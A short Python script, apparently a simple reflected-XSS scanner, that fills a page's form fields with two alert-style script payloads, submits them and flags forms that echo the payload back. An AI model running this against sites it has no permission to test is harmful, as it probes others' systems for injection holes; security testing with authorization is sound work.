import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin


def find_xss_vulnerability(url, html):
    payloads = ['<script>alert("XSS")</script>', '<img src="men" onerror={alert()}>']

    soup = BeautifulSoup(html, "html.parser")
    forms = soup.find_all("form")

    for form in forms:
        for payload in payloads:
            print("testing on form")
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = form.find_all("input")
            
            # Collecting textarea tags
            textareas = form.find_all("textarea")

            data = {}
            for input_tag in inputs:
                input_name = input_tag.get("name")
                input_type = input_tag.get("type", "text")
                input_value = input_tag.get("value", "")

                if input_type == "text":
                    data[input_name] = payload
                else:
                    data[input_name] = input_value

            # Handling textarea tags
            for textarea in textareas:
                textarea_name = textarea.get("name")
                print("Injecting on " + textarea_name)
                data[textarea_name] = payload

            target_url = urljoin(url, action)
            response = None
            if method == "post":
                response = requests.post(target_url, data=data)
            else:
                response = requests.get(target_url, params=data)

            if payload in response.text:
                print(f"Potential XSS vulnerability found in form at {target_url}")
                return True

    return False
